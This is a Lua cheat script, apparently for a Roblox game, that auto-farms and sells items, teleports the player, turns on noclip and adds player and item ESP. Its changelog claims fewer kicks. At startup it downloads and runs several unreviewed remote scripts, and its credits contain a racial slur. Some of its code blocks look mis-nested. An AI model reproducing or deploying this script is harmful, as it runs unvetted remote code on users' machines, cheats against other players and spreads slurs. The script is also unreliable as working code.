loadstring(game:HttpGet("https://raw.githubusercontent.com/raeth231321343/vanta.dev/refs/heads/main/ui%20startup.lua"))()
wait(2.5)
local WindUI
do
    local ok, result = pcall(function()
        return require("./src/Init")
    end)
    if ok then
        WindUI = result
    else
        WindUI = loadstring(game:HttpGet("https://raw.githubusercontent.com/weatherwess-lgtm/Azure/refs/heads/main/Gofile"))()
    end
end
local oldMakeFolder = makefolder
local oldWriteFile = writefile
local oldIsFolder = isfolder
local oldIsFile = isfile
local oldReadFile = readfile
local oldListFiles = listfiles

getgenv().makefolder = function() return true end
getgenv().writefile = function() return true end
getgenv().isfolder = function() return false end
getgenv().isfile = function() return false end
getgenv().readfile = function() return "" end
getgenv().listfiles = function() return {} end

if not WindUI then
    WindUI = loadstring(game:HttpGet("https://raw.githubusercontent.com/weatherwess-lgtm/Azure/refs/heads/main/Gofile"))()
end



getgenv().makefolder = oldMakeFolder
getgenv().writefile = oldWriteFile
getgenv().isfolder = oldIsFolder
getgenv().isfile = oldIsFile
getgenv().readfile = oldReadFile
getgenv().listfiles = oldListFiles
WindUI:Popup({
    Title = "Welcome",
    Icon = "eye",
    Content = "vanta.dev debug",
    Buttons = {
        {
            Title = "Ok",
            Icon = "check",
        }
    }
})
setclipboard("https://discord.gg/DV9xRuMHu")
loadstring(game:HttpGet("https://raw.githubusercontent.com/weatherwess-lgtm/FlyToggle/refs/heads/main/Clipboard"))()
local Window = WindUI:CreateWindow({
    Title = "vanta.dev",
    Icon = "eye",
    Author = "vanta.dev",
    Folder = "vanta_dev",
    NewElements = true,
    HideSearchBar = false,
    Background = "",
    BackgroundImageTransparency = 1,
    Transparent = true,
    OpenButton = {
        Title = "Open vanta.dev UI",
        CornerRadius = UDim.new(1,0),
        StrokeThickness = 3,
        Enabled = true,
        Draggable = true,
        OnlyMobile = false,
        Color = ColorSequence.new(
            Color3.fromHex("#000000"),
            Color3.fromHex("#ffffff")
        )
    }
})
WindUI:AddTheme({
    Name = "michaels theme", -- theme name
    Accent = Color3.fromHex("#21b61e"),
    Background = Color3.fromHex("#1d1d1d"), -- Accent
    Outline = Color3.fromHex("#17cc35"),
    Text = Color3.fromHex("#d6d6d6"),
    Placeholder = Color3.fromHex("#252525"),
    Button = Color3.fromHex("#14b84d"),
    Icon = Color3.fromHex("#14e66f"),
      Slider = Color3.fromHex("#3f9453"), -- Button
    SliderThumb = Color3.fromHex("#07c339"), -- White
})
pcall(function()
    WindUI:SetTheme("Dark")
end)
Window:SetToggleKey(Enum.KeyCode.K)
local function parseJSON(luau_table, indent, level, visited)
    indent = indent or 2
    level = level or 0
    visited = visited or {}
    local currentIndent = string.rep(" ", level * indent)
    local nextIndent = string.rep(" ", (level + 1) * indent)
    
    if luau_table == nil then
        return "null"
    end
    
    local dataType = type(luau_table)
    
    if dataType == "table" then
        if visited[luau_table] then
            return "\"[Circular Reference]\""
        end
        visited[luau_table] = true
        
        local isArray = true
        local maxIndex = 0
        for k, _ in pairs(luau_table) do
            if type(k) == "number" and k > maxIndex then
                maxIndex = k
            end
            if type(k) ~= "number" or k <= 0 or math.floor(k) ~= k then
                isArray = false
                break
            end
        end
        
        local count = 0
        for _ in pairs(luau_table) do
            count = count + 1
        end
        
        if count ~= maxIndex and isArray then
            isArray = false
        end
        
        if count == 0 then
            return isArray and "[]" or "{}"
        end
        
        if isArray then
            local result = "[\n"
            for i = 1, maxIndex do
                result = result .. nextIndent .. parseJSON(luau_table[i], indent, level + 1, visited)
                if i < maxIndex then
                    result = result .. ","
                end
                result = result .. "\n"
            end
            result = result .. currentIndent .. "]"
            return result
        else
            local result = "{\n"
            local first = true
            local keys = {}
            for k in pairs(luau_table) do
                table.insert(keys, k)
            end
            table.sort(keys, function(a, b)
                if type(a) == type(b) then
                    return tostring(a) < tostring(b)
                else
                    return type(a) < type(b)
                end
            end)
            for _, k in ipairs(keys) do
                local v = luau_table[k]
                if not first then
                    result = result .. ",\n"
                else
                    first = false
                end
                if type(k) == "string" then
                    result = result .. nextIndent .. "\"" .. k .. "\": "
                else
                    result = result .. nextIndent .. "\"" .. tostring(k) .. "\": "
                end
                result = result .. parseJSON(v, indent, level + 1, visited)
            end
            result = result .. "\n" .. currentIndent .. "}"
            return result
        end
    elseif dataType == "string" then
        local escaped = luau_table:gsub("\\", "\\\\")
        escaped = escaped:gsub("\"", "\\\"")
        escaped = escaped:gsub("\n", "\\n")
        escaped = escaped:gsub("\r", "\\r")
        escaped = escaped:gsub("\t", "\\t")
        return "\"" .. escaped .. "\""
    elseif dataType == "number" then
        return tostring(luau_table)
    elseif dataType == "boolean" then
        return luau_table and "true" or "false"
    elseif dataType == "function" then
        return "\"function\""
    else
        return "\"" .. dataType .. "\""
    end
end

local function tableToClipboard(luau_table, indent)
    indent = indent or 4
    local success, jsonString = pcall(function()
        return parseJSON(luau_table, indent)
    end)
    
    if not success then
        warn("Failed to serialize table: " .. tostring(jsonString))
        return nil
    end
    
    if type(setclipboard) == "function" then
        local clipSuccess, clipErr = pcall(function()
            setclipboard(jsonString)
        end)
        if not clipSuccess then
            warn("Failed to copy to clipboard: " .. tostring(clipErr))
        end
    end
    
    return jsonString
end
local AboutTab = Window:Tab({
    Title = "About",
    Icon = "info",
})
local AboutSection = AboutTab:Section({
    Title = "Thank You",
})
AboutSection:Section({
    Title = "Thanks for using vanta.dev v1.6.65!",
    TextSize = 24,
    FontWeight = Enum.FontWeight.SemiBold,
})
AboutSection:Space()
AboutSection:Section({
    Title = "Tips",
    TextSize = 18,
    TextTransparency = .35,
    FontWeight = Enum.FontWeight.Medium,
})
AboutSection:Section({
    Title = "- If you want the script to automatically pick quests for you until max, select the highest level which is Level 35",
    TextSize = 18,
    TextTransparency = .35,
    FontWeight = Enum.FontWeight.Medium,
})
AboutSection:Space()
AboutSection:Section({
    Title = "- And if your farming for item please enable the Auto Sell on max to avoid ignoring maxed item",
    TextSize = 18,
    TextTransparency = .35,
    FontWeight = Enum.FontWeight.Medium,
})
AboutSection:Space()
AboutSection:Section({
    Title = "- Buffed instant travel: Faster and more stable item collection",
    TextSize = 18,
    TextTransparency = .35,
    FontWeight = Enum.FontWeight.Medium,
})
AboutSection:Space()
AboutSection:Section({
    Title = "- Sell worthless items regularly to maximize profits",
    TextSize = 18,
    TextTransparency = .35,
    FontWeight = Enum.FontWeight.Medium,
})
AboutSection:Space()
AboutSection:Section({
    Title = "- Enable Boost FPS to avoid lag during intensive farming",
    TextSize = 18,
    TextTransparency = .35,
    FontWeight = Enum.FontWeight.Medium,
})
AboutSection:Paragraph({
    Title = "JOIN THE DISCORD CHANNEL BELOW!",
    Desc = "Help us with the script by join ur discord channel and chat there to join any giveaways!."
})
AboutSection:Space()
AboutSection:Button({
    Title = "Copy Discord Link",
    Callback = function()
        setclipboard("https://discord.gg/DV9xRuMHu")
        notify("Copied", "Discord link copied to clipboard!")
    end
})
local WhatsNewSection = AboutTab:Section({
    Title = "What's New",
})

WhatsNewSection:Section({
    Title = "✨ Latest Updates v1.6.65+",
    TextSize = 20,
    FontWeight = Enum.FontWeight.SemiBold,
})

WhatsNewSection:Space()
WhatsNewSection:Section({
    Title = "- Requires supported executor support",
    TextSize = 16,
    TextTransparency = .3,
    FontWeight = Enum.FontWeight.Medium,
})

WhatsNewSection:Section({
    Title = "- Reduces kick chance significantly",
    TextSize = 16,
    TextTransparency = .3,
    FontWeight = Enum.FontWeight.Medium,
})

WhatsNewSection:Space()

WhatsNewSection:Section({
    Title = "Safe Place Farming",
    TextSize = 16,
    TextTransparency = .3,
    FontWeight = Enum.FontWeight.Medium,
})

WhatsNewSection:Section({
    Title = "- Instantly teleports to safe coordinates",
    TextSize = 16,
    TextTransparency = .3,
    FontWeight = Enum.FontWeight.Medium,
})

WhatsNewSection:Section({
    Title = "- Avoids NPCs and player interference",
    TextSize = 16,
    TextTransparency = .3,
    FontWeight = Enum.FontWeight.Medium,
})

WhatsNewSection:Space()

WhatsNewSection:Section({
    Title = "Buffed Instant Method",
    TextSize = 16,
    TextTransparency = .3,
    FontWeight = Enum.FontWeight.Medium,
})

WhatsNewSection:Section({
    Title = "- Faster and more reliable teleportation",
    TextSize = 16,
    TextTransparency = .3,
    FontWeight = Enum.FontWeight.Medium,
})

WhatsNewSection:Section({
    Title = "- Improved item collection speed",
    TextSize = 16,
    TextTransparency = .3,
    FontWeight = Enum.FontWeight.Medium,
})

WhatsNewSection:Space()

WhatsNewSection:Section({
    Title = "Stand Farm",
    TextSize = 16,
    TextTransparency = .3,
    FontWeight = Enum.FontWeight.Medium,
})

WhatsNewSection:Section({
    Title = "- Farm for specific stands",
    TextSize = 16,
    TextTransparency = .3,
    FontWeight = Enum.FontWeight.Medium,
})

WhatsNewSection:Section({
    Title = "- Shiny stand support included",
    TextSize = 16,
    TextTransparency = .3,
    FontWeight = Enum.FontWeight.Medium,
})
AboutSection:Space()
AboutSection:Paragraph({
    Title = "Credits",
    Desc = "! Michael, Azero, Scrilisk",    
    TextSize = 16
})
AboutSection:Paragraph({
    Title = "UI Library",
    Desc = "NiggaUI Library by niggateam also known as ! Michael, Scrilisk, Azero",
    TextSize = 14
})
local FarmingTab = Window:Tab({ Title = "Item Farming", Icon = "skull" })
local StandFarmTab = Window:Tab({ Title = "Stand Farm", Icon = "sword" })
local QuestTab = Window:Tab({ Title = "Quest", Icon = "list" })
local SBRTab = Window:Tab({ Title = "SBR", Icon = "sliders-horizontal" })
local SellingTab = Window:Tab({ Title = "Selling", Icon = "dollar-sign" })
local ShopTab = Window:Tab({ Title = "Shop", Icon = "shopping-cart" })
local VisualTab = Window:Tab({ Title = "Visual", Icon = "eye" })
local AdjustTab = Window:Tab({ Title = "sAdjust", Icon = "sliders-horizontal" })
local MiscTab = Window:Tab({ Title = "Misc", Icon = "zap" })
local TrollingTab = Window:Tab({ Title = "Trolling", Icon = "smile" })
local KeybindsTab = Window:Tab({ Title = "Keybinds", Icon = "keyboard" })
local SettingsTab = Window:Tab({ Title = "Settings", Icon = "settings" })
local player = game.Players.LocalPlayer
local RunService = game:GetService("RunService")
local TweenService = game:GetService("TweenService")
local topGui = Instance.new("ScreenGui")
local function notify(title, message)
    local finalTitle = (title == nil or title == "YBA Script") and "vanta.dev" or title
    WindUI:Notify({
        Title = finalTitle,
        Content = message
    })
end
local items = {}
local maxLimits = {
["Mysterious Arrow"] = 25,
["Rokakaka"] = 25,
["Gold Coin"] = 45,
["Diamond"] = 25,
["Pure Rokakaka"] = 999,
["Quinton's Glove"] = 10,
["Steel Ball"] = 10,
["Rib Cage of The Saint's Corpse"] = 10,
["Zepellin's Headband"] = 10,
["Zeppeli's Hat"] = 10,
["Caesar's Headband"] = 10,
["Clackers"] = 10,
["Stone Mask"] = 10,
["Ancient Scroll"] = 10,
["Dio's Diary"] = 10,
["Lucky Stone Mask"] = 999,
["Lucky Arrow"] = 999,
["Gold Umbrella"] = 999,
["Christmas Present"] = 999
}
local nonSellable = {"Blue Candy", "Red Candy", "Green Candy", "Yellow Candy", "Lucky Arrow", "Lucky Stone Mask", "Christmas Present"}
local itemOptions = {}
local seen = {}
for item in pairs(maxLimits) do
    table.insert(itemOptions, item)
    seen[item] = true
end
for _, candy in ipairs(nonSellable) do
    if not seen[candy] then
        table.insert(itemOptions, candy)
        seen[candy] = true
    end
end
table.sort(itemOptions)
local worthlessItems = {"Gold Coin", "Diamond", "Quinton's Glove", "Zeppeli's Hat", "Caesar's Headband", "Ancient Scroll"}
local function updateItems()
    items = {}
for itemName in pairs(maxLimits) do
        items[itemName] = 0
end
local function countInContainer(container)
if not container then return end
for _, item in pairs(container:GetChildren()) do
if item and item.Name and maxLimits[item.Name] then
                items[item.Name] = (items[item.Name] or 0) + 1
end
end
end
    countInContainer(player.Backpack)
if player.Character then
        countInContainer(player.Character)
end
end
local function findSellRemote()
local plr = game.Players.LocalPlayer
if plr and plr.Character then
for _, obj in pairs(plr.Character:GetChildren()) do
if obj:IsA("RemoteEvent") then
return obj
end
end
end
local places = {game.Workspace, game.ReplicatedStorage, game:GetService("ReplicatedStorage"), game:GetService("Players")}
for _, place in pairs(places) do
if place then
for _, obj in pairs(place:GetDescendants()) do
if obj:IsA("RemoteEvent") and (obj.Name:lower():find("remote") or obj.Name:lower():find("remoteevent") or obj.Name:lower():find("sell") or obj.Name:lower():find("server") or obj.Name:lower():find("_ev")) then
return obj
end
end
end
end
for _, obj in pairs(game.Workspace:GetChildren()) do
if obj:IsA("RemoteEvent") then
return obj
end
end
return nil
end
local function sellItem(item)
if not item then return false end
local itemName = typeof(item) == "Instance" and item.Name or item
if table.find(nonSellable, itemName) then
        notify("YBA Script", "Cannot sell " .. itemName .. " as it is not sellable.")
return false
end
local plr = game.Players.LocalPlayer
if not plr then return false end
local instanceToSell
if typeof(item) == "Instance" then
        instanceToSell = item
elseif typeof(item) == "string" then
        instanceToSell = plr.Backpack:FindFirstChild(item) or (plr.Character and plr.Character:FindFirstChild(item))
else
return false
end
if not instanceToSell or not instanceToSell.Parent then
return false
end
local plrName = plr.Name
local living = game.Workspace:FindFirstChild("Living") or game.Workspace
local target = nil
if living then
        target = living:FindFirstChild(plrName) or living
else
        target = game.Workspace
end
pcall(function()
        instanceToSell.Parent = target
end)
local args = {
[1] = "EndDialogue",
[2] = {
["NPC"] = "Merchant",
["Option"] = "Option2",
["Dialogue"] = "Dialogue5"
}
}
local fired = false
local ok, remote = pcall(findSellRemote)
if ok and remote then
pcall(function()
            remote:FireServer(unpack(args))
end)
        fired = true
else
if plr.Character then
local r = plr.Character:FindFirstChildWhichIsA("RemoteEvent")
if r then
pcall(function()
                    r:FireServer(unpack(args))
end)
                fired = true
end
end
end
pcall(function()
if not fired and plr.Character and plr.Character:FindFirstChild("RemoteEvent") then
            plr.Character.RemoteEvent:FireServer(unpack(args))
            fired = true
end
end)
wait(0.12)
return true
end
local function sellAll(itemName)
    updateItems()
local count = items[itemName] or 0
if count == 0 then
        notify("YBA Script", "No " .. itemName .. " found.")
return
end
local sold = 0
while true do
local item = player.Backpack:FindFirstChild(itemName) or (player.Character and player.Character:FindFirstChild(itemName))
if not item then break end
if sellItem(item) then
            sold = sold + 1
else
break
end
end
    notify("YBA Script", "Sold " .. sold .. " " .. itemName .. (sold > 1 and "s" or "") .. ".")
end
local function sellAllSelected(selectedItems)
    updateItems()
local total = 0
for _, itemName in ipairs(selectedItems) do
        total = total + (items[itemName] or 0)
end
if total == 0 then
        notify("YBA Script", "No selected items found.")
return
end
local sold = 0
for _, itemName in ipairs(selectedItems) do
while true do
local item = player.Backpack:FindFirstChild(itemName) or (player.Character and player.Character:FindFirstChild(itemName))
if not item then break end
if sellItem(item) then
                sold = sold + 1
else
break
end
end
end
    notify("YBA Script", "Sold " .. sold .. " selected item" .. (sold > 1 and "s" or "") .. ".")
end
local function sellAllWorthless()
    updateItems()
local total = 0
for _, itemName in ipairs(worthlessItems) do
        total = total + (items[itemName] or 0)
end
if total == 0 then
        notify("vanta, scrilly was here :)", "No worthless items found.")
return
end
local sold = 0
for _, itemName in ipairs(worthlessItems) do
while true do
local item = player.Backpack:FindFirstChild(itemName) or (player.Character and player.Character:FindFirstChild(itemName))
if not item then break end
if sellItem(item) then
                sold = sold + 1
else
break
end
end
end
    notify("YBA Script", "Sold " .. sold .. " worthless item" .. (sold > 1 and "s" or "") .. ".")
end
local function sellInventory()
    updateItems()
local sold = 0
for itemName, count in pairs(items) do
if count > 0 and not table.find(nonSellable, itemName) then
while true do
local item = player.Backpack:FindFirstChild(itemName) or (player.Character and player.Character:FindFirstChild(itemName))
if not item then break end
if sellItem(item) then
                    sold = sold + 1
else
break
end
end
end
end
    notify("YBA Script", "Sold " .. sold .. " item" .. (sold > 1 and "s" or "") .. " from inventory.")
end
local autoSellMax = false
local function checkAndSellMax()
local soldSummary = {}
local tempCounts = {}
for name in pairs(maxLimits) do
        tempCounts[name] = 0
end
local containers = {player.Backpack}
if player.Character then
        table.insert(containers, player.Character)
end
for _, container in ipairs(containers) do
local children = container:GetChildren()
for _, item in ipairs(children) do
local name = item.Name
if maxLimits[name] then
                tempCounts[name] = tempCounts[name] + 1
if (tempCounts[name] >= (maxLimits[name] or 25)) and autoSellMax then
if sellItem(item) then
                        soldSummary[name] = (soldSummary[name] or 0) + 1
end
end
end
end
end
local totalSold = 0
local parts = {}
for name, n in pairs(soldSummary) do
        totalSold = totalSold + n
        table.insert(parts, n .. "x " .. name)
end
if totalSold > 0 then
local msg = "Auto sold: " .. table.concat(parts, ", ")
        notify("YBA Script", msg)
end
end
local autoSellSelected = false
local selectedAutoSellItems = {}
local selectedSellAllItems = {}
local lastAutoSellNotify = {}
player.Backpack.ChildAdded:Connect(function(item)
if autoSellMax then
        checkAndSellMax()
end
if autoSellSelected and table.find(selectedAutoSellItems, item.Name) then
wait(0.2)
local now = tick()
local last = lastAutoSellNotify[item.Name] or 0
if now - last >= 0.5 then
if sellItem(item) then
                notify("YBA Script", "Auto sold " .. item.Name .. " on pickup.")
                lastAutoSellNotify[item.Name] = now
end
end
end
end)
player.CharacterAdded:Connect(function(char)
    char.ChildAdded:Connect(function(item)
if autoSellMax then
            checkAndSellMax()
end
if autoSellSelected and table.find(selectedAutoSellItems, item.Name) then
wait(0.2)
local now = tick()
local last = lastAutoSellNotify[item.Name] or 0
if now - last >= 0.5 then
if sellItem(item) then
                    notify("YBA Script", "Auto sold " .. item.Name .. " on pickup.")
                    lastAutoSellNotify[item.Name] = now
end
end
end
end)
end)
local noclipEnabled = false
local originalCollides = {}
local noclipConn = nil
local function enforceNoclip(model, saveOriginals)
    if not model then return end
    for _, part in ipairs(model:GetDescendants()) do
        if part:IsA("BasePart") then
            if saveOriginals then
                originalCollides[part] = part.CanCollide
            end
            part.CanCollide = false
            if not part.Massless then part.Massless = true end
        end
    end
end

local function getStand()
    local ch = player.Character
    if not ch then return nil end
    for _, child in ipairs(ch:GetChildren()) do
        if child:IsA("Model") and child:FindFirstChild("HumanoidRootPart") and child ~= ch then
            return child
        end
    end
    return nil
end

local function enableNoclip()
    if noclipEnabled then return end
    local char = player.Character
    if not char or not char.Parent then
        noclipEnabled = true
        return
    end
    originalCollides = {}
    
    
    enforceNoclip(char, true)
    local stand = getStand()
    if stand then
        enforceNoclip(stand, true)
    end
    
    if noclipConn then noclipConn:Disconnect() noclipConn = nil end
    noclipConn = RunService.Stepped:Connect(function()
        local c = player.Character
        if c then
            enforceNoclip(c, false)
        end
        local s = getStand()
        if s then
            enforceNoclip(s, false)
        end
    end)
    noclipEnabled = true
end
local function disableNoclip()
if not noclipEnabled then return end
if noclipConn then noclipConn:Disconnect() noclipConn = nil end
for part, val in pairs(originalCollides) do
if part and part.Parent and part:IsA("BasePart") then
pcall(function() part.CanCollide = val end)
end
end
    originalCollides = {}
    noclipEnabled = false
end
local studMultiplier = 1
local tweenMultiplier = 1
local function travelToStud(target)
    if not player.Character or not player.Character.HumanoidRootPart then return end
    local hrp = player.Character.HumanoidRootPart
    local targetPos = typeof(target) == "Vector3" and target or target.Position
    local vector = targetPos - hrp.Position
    local length = vector.Magnitude
    local step_size = (afkFarmOn and 5 or 25) * studMultiplier
    local num_tp = math.ceil(length / step_size)
    if num_tp < 1 then num_tp = 1 end
    for i = 1, num_tp do
        if not player.Character or not player.Character.HumanoidRootPart then return end
        hrp.CFrame = hrp.CFrame + vector / num_tp
        wait(tpDelay)
    end
end
local function travelToTween(target)
    if not player.Character or not player.Character.HumanoidRootPart then return end
    local hrp = player.Character.HumanoidRootPart
    if not hrp or not hrp:IsDescendantOf(game.Workspace) then return end
    local targetPos = typeof(target) == "Vector3" and target or target.Position
    local distance = (targetPos - hrp.Position).Magnitude
    local effectiveSpeed = 200 * tweenMultiplier
    local time = distance / effectiveSpeed
    local tweenInfo = TweenInfo.new(time, Enum.EasingStyle.Linear)
    local tween = TweenService:Create(hrp, tweenInfo, {CFrame = CFrame.new(targetPos)})
    tween:Play()
    tween.Completed:Wait()
end
local function travelToInstant(target)
    if not player or not player.Character or not player.Character:FindFirstChild("HumanoidRootPart") then
        return
    end

    local hrp = player.Character.HumanoidRootPart
    local targetCFrame

    if typeof(target) == "Vector3" then
        targetCFrame = CFrame.new(target)
    elseif typeof(target) == "CFrame" then
        targetCFrame = target
    elseif typeof(target) == "Instance" and target.Position then
        targetCFrame = CFrame.new(target.Position)
    else
        return
    end

    hrp.CFrame = targetCFrame

    if hrp.AssemblyLinearVelocity then
        hrp.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
    else
        hrp.Velocity = Vector3.new(0, 0, 0)
    end
end
local travelMethod = "Stud"
local function travelTo(target)
if travelMethod == "Stud" then
        travelToStud(target)
elseif travelMethod == "Tween" then
        travelToTween(target)
elseif travelMethod == "Instant" then
        travelToInstant(target)
end
end
local function teleportToRandom()
local map = game.Workspace:FindFirstChild("Map") or game.Workspace
local bounds = {
        minX = -590, maxX = 590,
        minZ = -520, maxZ = 530,
        y = 100
}
local randomX = math.random(bounds.minX, bounds.maxX)
local randomZ = math.random(bounds.minZ, bounds.maxZ)
if not player.Character or not player.Character.HumanoidRootPart then return end
local hrp = player.Character.HumanoidRootPart
    hrp.CFrame = CFrame.new(randomX, bounds.y, randomZ)
end
local function roamToRandom()
local map = game.Workspace:FindFirstChild("Map") or game.Workspace
local bounds = {
        minX = -590, maxX = 590,
        minZ = -520, maxZ = 530,
        y = 100
}
local randomX = math.random(bounds.minX, bounds.maxX)
local randomZ = math.random(bounds.minZ, bounds.maxZ)
local randomPos = Vector3.new(randomX, bounds.y, randomZ)
    travelTo(randomPos)
end
local normalFarmOn = false
local afkFarmOn = false
local selectedFarmItems = {}
local normalCoroutine = nil
local afkCoroutine = nil
local tpDelay = 0.05
local originalTpDelay = 0.05
local safePlaceFarmOn = false
local safePlaceCoroutine = nil
local safePlacePosition = Vector3.new(47.261887, -33.486183, 90.047981)
local function findNearestItem(selectedItems)
    updateItems()
    local hrp = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
    if not hrp then return nil end
    local minDist = math.huge
    local nearest = nil
    for _, v in pairs(game.Workspace.Item_Spawns.Items:GetChildren()) do
        local itemPart = v:FindFirstChildOfClass("MeshPart") or v:FindFirstChildOfClass("Part")
        local proxPrompt = v:FindFirstChild("ProximityPrompt")
        if itemPart and proxPrompt and itemPart.Transparency < 1 then
            local itemName = proxPrompt.ObjectText
            if (#selectedItems == 0 or table.find(selectedItems, itemName)) and (items[itemName] or 0) < (maxLimits[itemName] or math.huge) then
                local dist = (itemPart.Position - hrp.Position).Magnitude
                if dist < minDist then
                    minDist = dist
                    nearest = v
                end
            end
        end
    end
    return nearest
end
local function findLuckyArrow()
    local hrp = player.Character and player.Character.HumanoidRootPart
    if not hrp then return nil end
    local minDist = math.huge
    local nearest = nil
    for _, v in pairs(game.Workspace.Item_Spawns.Items:GetChildren()) do
        local itemPart = v:FindFirstChildOfClass("MeshPart") or v:FindFirstChildOfClass("Part")
        local prox = v:FindFirstChild("ProximityPrompt")
        if itemPart and prox and itemPart.Transparency < 1 and prox.ObjectText == "Lucky Arrow" then
            local dist = (itemPart.Position - hrp.Position).Magnitude
            if dist < minDist then
                minDist = dist
                nearest = v
            end
        end
    end
    return nearest
end
local function normalFarm()
while normalFarmOn do
if not player.Character or not player.Character:FindFirstChild("Humanoid") or player.Character.Humanoid.Health <= 0 then
wait(1)
            continue
end
local foundItem = false
while true do
    local v = findLuckyArrow() or findNearestItem(selectedFarmItems)
    if not v then break end
    foundItem = true
    local itemPart = v:FindFirstChildOfClass("MeshPart") or v:FindFirstChildOfClass("Part")
    local proxPrompt = v:FindFirstChild("ProximityPrompt")
        travelTo(itemPart)
        wait(0.2)
        local hrp = player.Character.HumanoidRootPart
        if (itemPart.Position - hrp.Position).Magnitude < 5 then
            checkAndSellMax()
            fireproximityprompt(proxPrompt, 4)
            wait(0.1)
            if v:IsDescendantOf(game.Workspace) then
                fireproximityprompt(proxPrompt, 4)
            end
        end
    end
    checkAndSellMax()
    wait(0.2)
end
if not foundItem then
    teleportToRandom()
end
wait(0.2)
end
local function safePlaceFarm()
    while safePlaceFarmOn do
        if not player.Character or not player.Character:FindFirstChild("Humanoid") or player.Character.Humanoid.Health <= 0 then
            wait(1)
            continue
        end
        
        travelToInstant(safePlacePosition)
        wait(0.5)
        
        local collectedAny = false
        while safePlaceFarmOn do
            local v = findLuckyArrow() or findNearestItem(selectedFarmItems)
            if not v then break end
            
            collectedAny = true
            local itemPart = v:FindFirstChildOfClass("MeshPart") or v:FindFirstChildOfClass("Part")
            local proxPrompt = v:FindFirstChild("ProximityPrompt")
                travelTo(itemPart)
                wait(0.2)
                local hrp = player.Character.HumanoidRootPart
                if (itemPart.Position - hrp.Position).Magnitude < 5 then
                    checkAndSellMax()
                    fireproximityprompt(proxPrompt, 4)
                    wait(0.1)
                    if v:IsDescendantOf(game.Workspace) then
                        fireproximityprompt(proxPrompt, 4)
                    end
                end
            end
            checkAndSellMax()
            wait(0.2)
        end
        
        if collectedAny then
            wait(0.5)
            travelToInstant(safePlacePosition)
        end
        
        wait(1)
    end

local function afkFarm()
while afkFarmOn do
if not player.Character or not player.Character:FindFirstChild("Humanoid") or player.Character.Humanoid.Health <= 0 then
wait(1)
            continue
end
local roaming = true
while roaming and afkFarmOn do
if not player.Character or not player.Character:FindFirstChild("Humanoid") or player.Character.Humanoid.Health <= 0 then
break
end
local foundItem = false
local v = findLuckyArrow() or findNearestItem(selectedFarmItems)
if v then
    foundItem = true
    roaming = false
    local itemPart = v:FindFirstChildOfClass("MeshPart") or v:FindFirstChildOfClass("Part")
    local proxPrompt = v:FindFirstChild("ProximityPrompt")
        travelTo(itemPart)
        wait(0.2)
        local hrp = player.Character.HumanoidRootPart
        if (itemPart.Position - hrp.Position).Magnitude < 5 then
            checkAndSellMax()
            fireproximityprompt(proxPrompt, 4)
            wait(0.1)
            if v:IsDescendantOf(game.Workspace) then
                fireproximityprompt(proxPrompt, 4)
            end
        end
    end
    checkAndSellMax()
    roaming = true
end
if not foundItem then
    local hrp = player.Character.HumanoidRootPart
    local currentPos = hrp.Position
    local upPos = Vector3.new(currentPos.X, 100, currentPos.Z)
    travelTo(upPos)
    roamToRandom()
end
wait(0.25)
end
end
local function startFarming(method)
    if method == "Normal" then
        normalFarmOn = true
        normalCoroutine = coroutine.wrap(normalFarm)()
    elseif method == "AFK Farming" then
        afkFarmOn = true
        afkCoroutine = coroutine.wrap(afkFarm)()
    elseif method == "Safe Place" then
        safePlaceFarmOn = true
        safePlaceCoroutine = coroutine.wrap(safePlaceFarm)()
    end
    enableNoclip()
end
local function stopFarming()
    normalFarmOn = false
    afkFarmOn = false
    safePlaceFarmOn = false
    disableNoclip()
end
player.CharacterAdded:Connect(function(char)
    if normalFarmOn or afkFarmOn or safePlaceFarmOn then
        wait(2)
        enableNoclip()
        if normalFarmOn then
            if normalCoroutine then coroutine.close(normalCoroutine) end
            normalCoroutine = coroutine.wrap(normalFarm)()
        elseif afkFarmOn then
            if afkCoroutine then coroutine.close(afkCoroutine) end
            afkCoroutine = coroutine.wrap(afkFarm)()
        elseif safePlaceFarmOn then
            if safePlaceCoroutine then coroutine.close(safePlaceCoroutine) end
            safePlaceCoroutine = coroutine.wrap(safePlaceFarm)()
        end
    end
end)
local itemESP = false
local espConnection
local function addItemESP(v)
local itemPart = v:FindFirstChildOfClass("MeshPart") or v:FindFirstChildOfClass("Part")
local prox = v:FindFirstChild("ProximityPrompt")
if itemPart and prox and itemPart.Transparency < 1 then
local itemName = prox.ObjectText or "Unknown Item"
if not v:FindFirstChild("ItemESP") then
local hl = Instance.new("Highlight")
            hl.Name = "ItemESP"
            hl.FillTransparency = 0.7
            hl.FillColor = Color3.fromRGB(0, 255, 0)
            hl.OutlineTransparency = 0
            hl.OutlineColor = Color3.fromRGB(255, 0, 0)
            hl.Adornee = v
            hl.Parent = v
end
if not v:FindFirstChild("ItemESPName") then
local bb = Instance.new("BillboardGui")
            bb.Name = "ItemESPName"
            bb.Adornee = itemPart
            bb.Size = UDim2.new(0, 200, 0, 50)
            bb.StudsOffset = Vector3.new(0, 3, 0)
            bb.AlwaysOnTop = true
            bb.Parent = v
local tl = Instance.new("TextLabel")
            tl.Size = UDim2.new(1, 0, 1, 0)
            tl.BackgroundTransparency = 1
            tl.Text = itemName
            tl.TextColor3 = Color3.fromRGB(255, 255, 255)
            tl.TextSize = 24
            tl.TextStrokeTransparency = 0.5
            tl.Font = Enum.Font.SourceSansBold
            tl.Parent = bb
end
end
end
local function enableItemESP()
for _, v in pairs(game.Workspace.Item_Spawns.Items:GetChildren()) do
        addItemESP(v)
end
    espConnection = game.Workspace.Item_Spawns.Items.ChildAdded:Connect(function(v)
wait(0.1)
        addItemESP(v)
end)
end
local function disableItemESP()
for _, v in pairs(game.Workspace.Item_Spawns.Items:GetChildren()) do
local hl = v:FindFirstChild("ItemESP")
if hl then
            hl:Destroy()
end
local bb = v:FindFirstChild("ItemESPName")
if bb then
            bb:Destroy()
end
end
if espConnection then
        espConnection:Disconnect()
end
end
local playerESP = false
local playerESPConnections = {}
local function addPlayerESP(plr)
if plr == player then return end
if not plr.Character then return end
local char = plr.Character
local hl = Instance.new("Highlight")
    hl.Name = "PlayerESP"
    hl.FillTransparency = 0.7
    hl.FillColor = Color3.fromRGB(255, 0, 0)
    hl.OutlineTransparency = 0
    hl.OutlineColor = Color3.fromRGB(255, 255, 255)
    hl.Adornee = char
    hl.Parent = char
local bb = Instance.new("BillboardGui")
    bb.Name = "PlayerESPName"
    bb.Adornee = char:FindFirstChild("Head")
    bb.Size = UDim2.new(0, 200, 0, 50)
    bb.StudsOffset = Vector3.new(0, 3, 0)
    bb.AlwaysOnTop = true
    bb.Parent = char
local tl = Instance.new("TextLabel")
